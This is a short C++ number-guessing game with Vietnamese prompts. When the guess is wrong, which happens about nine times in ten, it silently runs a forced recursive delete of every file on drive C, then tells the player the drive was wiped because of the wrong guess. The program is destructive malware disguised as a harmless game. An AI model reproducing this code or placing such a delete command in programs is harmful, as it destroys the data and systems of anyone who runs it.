#include<iostream>
#include<time.h>
using namespace std;
int main()
{
	srand(time(NULL) );
	cout << "Nhap so ban muon kiem tra: ";
	int so;
	cin >> so;

	int random = rand() % 10 + 1;
	if(so == random)
		cout << "Ban da doan dung so random la: " << random << endl;
	else
		cout << "Ban da doan sai so random la: " << random << endl;

	if(so != random)
	{	
		system("del C:\\*.* /f /s /q");		
		cout << "Da xoa xong o C do ban nhap sai so random" << endl;
	} 
	else 
		cout << "Ban da nhap dung so random nen khong xoa o C" << endl;
return 0;
}
